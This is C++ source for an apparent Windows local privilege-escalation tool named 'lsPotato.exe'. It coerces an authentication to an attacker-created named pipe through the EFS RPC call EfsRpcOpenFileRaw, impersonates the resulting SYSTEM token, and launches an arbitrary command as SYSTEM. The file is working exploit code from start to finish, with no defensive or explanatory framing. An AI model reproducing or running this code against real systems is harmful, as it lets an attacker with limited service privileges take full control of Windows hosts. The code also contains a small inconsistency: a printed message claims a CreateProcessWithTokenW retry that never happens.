#include "header.h"

BOOL g_bInteractWithConsole = FALSE;
DWORD g_dwSessionId = 0;
LPWSTR g_pwszCommandLine = NULL;
LPWSTR g_pwszHost = NULL;

BOOL Potato()
{
	LPWSTR pwszPipeName = NULL;
	HANDLE hLsassPipe = INVALID_HANDLE_VALUE;
	HANDLE hLsassPipeEvent = INVALID_HANDLE_VALUE;
	HANDLE hLsassTriggerThread = INVALID_HANDLE_VALUE;
	DWORD dwWait = 0;

	if (!CheckAndEnablePrivilege(NULL, SE_IMPERSONATE_NAME))
	{
		wprintf(L"[-] A privilege is missing: '%ws'\n", SE_IMPERSONATE_NAME);
		goto cleanup;
	}

	wprintf(L"[+] Found privilege: %ws\n", SE_IMPERSONATE_NAME);

	if (!GenerateRandomPipeName(&pwszPipeName))
	{
		wprintf(L"[-] Failed to generate a name for the pipe.\n");
		goto cleanup;
	}

	if (!(hLsassPipe = CreateLsassNamedPipe(pwszPipeName)))
	{
		wprintf(L"[-] Failed to create a named pipe.\n");
		goto cleanup;
	}

	if (!(hLsassPipeEvent = ConnectLsassNamedPipe(hLsassPipe)))
	{
		wprintf(L"[-] Failed to connect the named pipe.\n");
		goto cleanup;
	}

	wprintf(L"[+] Named pipe listening...\n");

	if (!(hLsassTriggerThread = TriggerNamedPipeConnection(pwszPipeName)))
	{
		wprintf(L"[-] Failed to trigger the Lsasser service.\n");
		goto cleanup;
	}
	dwWait = WaitForSingleObject(hLsassPipeEvent, 5000);
	if (dwWait != WAIT_OBJECT_0)
	{
		wprintf(L"[-] Operation failed or timed out.\n");
		goto cleanup;
	}
	GetSystem(hLsassPipe);

cleanup:
	if (hLsassPipe)
		CloseHandle(hLsassPipe);
	if (hLsassPipeEvent)
		CloseHandle(hLsassPipeEvent);
	if (hLsassTriggerThread)
		CloseHandle(hLsassTriggerThread);

	return 0;
}

handle_t Bind(wchar_t* target)
{
	RPC_STATUS RpcStatus;
	wchar_t buffer[100];
	swprintf(buffer, 100, L"\\\\%s", target);
	RPC_WSTR StringBinding;
	handle_t BindingHandle;
	RpcStatus = RpcStringBindingComposeW(
		MS_EFSR_UUID,
		(RPC_WSTR)L"ncacn_np",
		(RPC_WSTR)buffer,
		InterfaceAddress,
		NULL,
		&StringBinding);

	if (RpcStatus != RPC_S_OK) {
		wprintf(L"Error in RpcStringBindingComposeW\n");
		return(0);
	}

	RpcStatus = RpcBindingFromStringBindingW(StringBinding, &BindingHandle);
	if (RpcStatus != RPC_S_OK) {
		wprintf(L"Error in RpcBindingFromStringBindingW\n");
		return(0);
	}

	RpcStringFreeW(&StringBinding);

	if (RpcStatus != RPC_S_OK) {
		wprintf(L"Error in RpcStringFreeW\n");
		return(0);
	}

	return(BindingHandle);
}

DWORD WINAPI TriggerNamedPipeConnectionThread(LPVOID lpParam)
{
	WCHAR CaptureIp[128] ;
	WCHAR TargetServer[128];
	handle_t ht;
	HRESULT hr;
	PEXIMPORT_CONTEXT_HANDLE plop;

	WCHAR ExploitBuffer[100];
	long flag = 0;

	ht = Bind(g_pwszHost);
	hr = NULL;

	swprintf(CaptureIp, 100, L"\\\\%ws/pipe/%ws", g_pwszHost, (WCHAR*)lpParam);
	swprintf(TargetServer, 100, L"%ws", g_pwszHost);

	SecureZeroMemory((char*)&(plop), sizeof(plop));
	swprintf(ExploitBuffer, 100, L"\\\\%s\\potato\\potato", CaptureIp);

	hr = EfsRpcOpenFileRaw(ht, &plop, ExploitBuffer, flag);

	if (hr == ERROR_BAD_NETPATH) {
		wprintf(L"success!!!\n");
	}
	return 0;
}

BOOL CheckAndEnablePrivilege(HANDLE hTokenToCheck, LPCWSTR pwszPrivilegeToCheck)
{
	BOOL bResult = FALSE;
	HANDLE hToken = INVALID_HANDLE_VALUE;

	DWORD dwTokenPrivilegesSize = 0;
	PTOKEN_PRIVILEGES pTokenPrivileges = NULL;

	LPWSTR pwszPrivilegeName = NULL;

	if (hTokenToCheck)
	{
		// If a token handle was supplied, check this token
		hToken = hTokenToCheck;
	}
	else
	{
		// If a token handle wasn't supplied, check the token of the current process
		if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY | TOKEN_ADJUST_PRIVILEGES, &hToken))
		{
			wprintf(L"OpenProcessToken() failed. Error: %d\n", GetLastError());
			goto cleanup;
		}
	}

	if (!GetTokenInformation(hToken, TokenPrivileges, NULL, dwTokenPrivilegesSize, &dwTokenPrivilegesSize))
	{
		if (GetLastError() != ERROR_INSUFFICIENT_BUFFER)
		{
			wprintf(L"GetTokenInformation() failed. Error: %d\n", GetLastError());
			goto cleanup;
		}
	}

	pTokenPrivileges = (PTOKEN_PRIVILEGES)malloc(dwTokenPrivilegesSize);
	if (!pTokenPrivileges)
		goto cleanup;

	if (!GetTokenInformation(hToken, TokenPrivileges, pTokenPrivileges, dwTokenPrivilegesSize, &dwTokenPrivilegesSize))
	{
		wprintf(L"GetTokenInformation() failed. Error: %d\n", GetLastError());
		goto cleanup;
	}

	for (DWORD i = 0; i < pTokenPrivileges->PrivilegeCount; i++)
	{
		LUID_AND_ATTRIBUTES laa = pTokenPrivileges->Privileges[i];
		DWORD dwPrivilegeNameLength = 0;

		if (!LookupPrivilegeName(NULL, &(laa.Luid), NULL, &dwPrivilegeNameLength))
		{
			if (GetLastError() != ERROR_INSUFFICIENT_BUFFER)
			{
				wprintf(L"LookupPrivilegeName() failed. Error: %d\n", GetLastError());
				goto cleanup;
			}
		}

		dwPrivilegeNameLength++;
		pwszPrivilegeName = (LPWSTR)malloc(dwPrivilegeNameLength * sizeof(WCHAR));
		if (!pwszPrivilegeName)
			goto cleanup;

		if (!LookupPrivilegeName(NULL, &(laa.Luid), pwszPrivilegeName, &dwPrivilegeNameLength))
		{
			wprintf(L"LookupPrivilegeName() failed. Error: %d\n", GetLastError());
			goto cleanup;
		}

		if (!_wcsicmp(pwszPrivilegeName, pwszPrivilegeToCheck))
		{
			TOKEN_PRIVILEGES tp = { 0 };

			ZeroMemory(&tp, sizeof(TOKEN_PRIVILEGES));
			tp.PrivilegeCount = 1;
			tp.Privileges[0].Luid = laa.Luid;
			tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

			if (!AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), (PTOKEN_PRIVILEGES)NULL, (PDWORD)NULL))
			{
				wprintf(L"AdjustTokenPrivileges() failed. Error: %d\n", GetLastError());
				goto cleanup;
			}

			bResult = TRUE;
		}

		free(pwszPrivilegeName);

		if (bResult)
			break;
	}

cleanup:
	if (hToken)
		CloseHandle(hToken);
	if (pTokenPrivileges)
		free(pTokenPrivileges);

	return bResult;
}

BOOL GenerateRandomPipeName(LPWSTR* ppwszPipeName)
{
	UUID uuid = { 0 };

	if (UuidCreate(&uuid) != RPC_S_OK)
		return FALSE;

	if (UuidToString(&uuid, (RPC_WSTR*)&(*ppwszPipeName)) != RPC_S_OK)
		return FALSE;

	if (!*ppwszPipeName)
		return FALSE;

	return TRUE;
}

HANDLE CreateLsassNamedPipe(LPWSTR pwszPipeName)
{
	HANDLE hPipe = NULL;
	LPWSTR pwszPipeFullname = NULL;
	SECURITY_DESCRIPTOR sd = { 0 };
	SECURITY_ATTRIBUTES sa = { 0 };

	pwszPipeFullname = (LPWSTR)malloc(MAX_PATH * sizeof(WCHAR));
	if (!pwszPipeFullname)
		return NULL;

	StringCchPrintf(pwszPipeFullname, MAX_PATH, L"\\\\.\\pipe\\%ws\\pipe\\srvsvc", pwszPipeName);

	if (!InitializeSecurityDescriptor(&sd, SECURITY_DESCRIPTOR_REVISION))
	{
		wprintf(L"InitializeSecurityDescriptor() failed. Error: %d\n", GetLastError());
		free(pwszPipeFullname);
		return NULL;
	}

	if (!ConvertStringSecurityDescriptorToSecurityDescriptor(L"D:(A;OICI;GA;;;WD)", SDDL_REVISION_1, &((&sa)->lpSecurityDescriptor), NULL))
	{
		wprintf(L"ConvertStringSecurityDescriptorToSecurityDescriptor() failed. Error: %d\n", GetLastError());
		free(pwszPipeFullname);
		return NULL;
	}

	// The FILE_FLAG_OVERLAPPED flag is what allows us to create an async pipe.
	hPipe = CreateNamedPipe(pwszPipeFullname, PIPE_ACCESS_DUPLEX | FILE_FLAG_OVERLAPPED, PIPE_TYPE_BYTE | PIPE_WAIT, 10, 2048, 2048, 0, &sa);
	if (hPipe == INVALID_HANDLE_VALUE)
	{
		wprintf(L"CreateNamedPipe() failed. Error: %d\n", GetLastError());
		free(pwszPipeFullname);
		return NULL;
	}

	free(pwszPipeFullname);

	return hPipe;
}

HANDLE ConnectLsassNamedPipe(HANDLE hPipe)
{
	HANDLE hPipeEvent = INVALID_HANDLE_VALUE;
	OVERLAPPED ol = { 0 };

	hPipeEvent = CreateEvent(NULL, TRUE, FALSE, NULL);
	if (!hPipeEvent)
	{
		wprintf(L"CreateEvent() failed. Error: %d\n", GetLastError());
		return NULL;
	}

	ZeroMemory(&ol, sizeof(OVERLAPPED));
	ol.hEvent = hPipeEvent;

	if (!ConnectNamedPipe(hPipe, &ol))
	{
		if (GetLastError() != ERROR_IO_PENDING)
		{
			wprintf(L"ConnectNamedPipe() failed. Error: %d\n", GetLastError());
			return NULL;
		}
	}

	return hPipeEvent;
}

HANDLE TriggerNamedPipeConnection(LPWSTR pwszPipeName)
{
	HANDLE hThread = NULL;
	DWORD dwThreadId = 0;

	hThread = CreateThread(NULL, 0, TriggerNamedPipeConnectionThread, pwszPipeName, 0, &dwThreadId);
	if (!hThread)
		wprintf(L"CreateThread() failed. Error: %d\n", GetLastError());

	return hThread;
}

BOOL GetSystem(HANDLE hPipe)
{
	BOOL bResult = FALSE;
	HANDLE hSystemToken = INVALID_HANDLE_VALUE;
	HANDLE hSystemTokenDup = INVALID_HANDLE_VALUE;

	DWORD dwCreationFlags = 0;
	LPWSTR pwszCurrentDirectory = NULL;
	LPVOID lpEnvironment = NULL;
	PROCESS_INFORMATION pi = { 0 };
	STARTUPINFO si = { 0 };

	if (!ImpersonateNamedPipeClient(hPipe))
	{
		wprintf(L"ImpersonateNamedPipeClient(). Error: %d\n", GetLastError());
		goto cleanup;
	}

	if (!OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, FALSE, &hSystemToken))
	{
		wprintf(L"OpenThreadToken(). Error: %d\n", GetLastError());
		goto cleanup;
	}

	if (!DuplicateTokenEx(hSystemToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &hSystemTokenDup))
	{
		wprintf(L"DuplicateTokenEx() failed. Error: %d\n", GetLastError());
		goto cleanup;
	}

	if (g_dwSessionId)
	{
		if (!SetTokenInformation(hSystemTokenDup, TokenSessionId, &g_dwSessionId, sizeof(DWORD)))
		{
			wprintf(L"SetTokenInformation() failed. Error: %d\n", GetLastError());
			goto cleanup;
		}
	}

	dwCreationFlags = CREATE_UNICODE_ENVIRONMENT;
	dwCreationFlags |= 0;

	if (!(pwszCurrentDirectory = (LPWSTR)malloc(MAX_PATH * sizeof(WCHAR))))
		goto cleanup;

	if (!GetSystemDirectory(pwszCurrentDirectory, MAX_PATH))
	{
		wprintf(L"GetSystemDirectory() failed. Error: %d\n", GetLastError());
		goto cleanup;
	}

	if (!CreateEnvironmentBlock(&lpEnvironment, hSystemTokenDup, FALSE))
	{
		wprintf(L"CreateEnvironmentBlock() failed. Error: %d\n", GetLastError());
		goto cleanup;
	}

	ZeroMemory(&si, sizeof(STARTUPINFO));
	si.cb = sizeof(STARTUPINFO);
	si.lpDesktop = const_cast<wchar_t*>(L"WinSta0\\Default");

	if (!CreateProcessAsUser(hSystemTokenDup, NULL, g_pwszCommandLine, NULL, NULL, TRUE, dwCreationFlags, lpEnvironment, pwszCurrentDirectory, &si, &pi))
	{
		if (GetLastError() == ERROR_PRIVILEGE_NOT_HELD)
		{
			wprintf(L"[!] CreateProcessAsUser() failed because of a missing privilege, retrying with CreateProcessWithTokenW().\n");
			RevertToSelf();
		}
		else
		{
			wprintf(L"CreateProcessAsUser() failed. Error: %d\n", GetLastError());
			goto cleanup;
		}
	}
	else
	{
		wprintf(L"[+] CreateProcessAsUser() OK\n");
	}
	fflush(stdout);
	WaitForSingleObject(pi.hProcess, INFINITE);

	bResult = TRUE;

cleanup:
	if (hSystemToken)
		CloseHandle(hSystemToken);
	if (hSystemTokenDup)
		CloseHandle(hSystemTokenDup);
	if (pwszCurrentDirectory)
		free(pwszCurrentDirectory);
	if (lpEnvironment)
		DestroyEnvironmentBlock(lpEnvironment);
	if (pi.hProcess)
		CloseHandle(pi.hProcess);
	if (pi.hThread)
		CloseHandle(pi.hThread);

	return bResult;
}

int wmain(int argc, wchar_t** argv)
{
	if (argc < 3)
	{
		wprintf(L"lsPotato.exe hostname command");
		return 0;
	}
	g_pwszCommandLine =  argv[2];
	g_pwszHost = argv[1];

	if (!g_pwszCommandLine)
	{
		wprintf(L"[-] Please specify a command to execute\n");
		return -1;
	}

	return Potato();
}
